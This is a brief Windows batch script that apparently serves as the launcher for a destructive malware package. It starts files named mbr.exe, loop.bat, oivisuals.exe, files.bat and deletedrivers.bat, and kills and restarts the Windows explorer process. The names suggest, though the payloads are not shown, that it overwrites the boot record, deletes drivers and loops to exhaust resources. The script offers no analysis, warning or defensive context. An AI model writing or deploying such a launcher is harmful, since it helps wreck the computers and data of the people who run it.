:: START
@echo off
start loop.bat
start mbr.exe
start oivisuals.exe
taskkill /f /im explorer.exe
start explorer
start files.bat
start deletedrivers.bat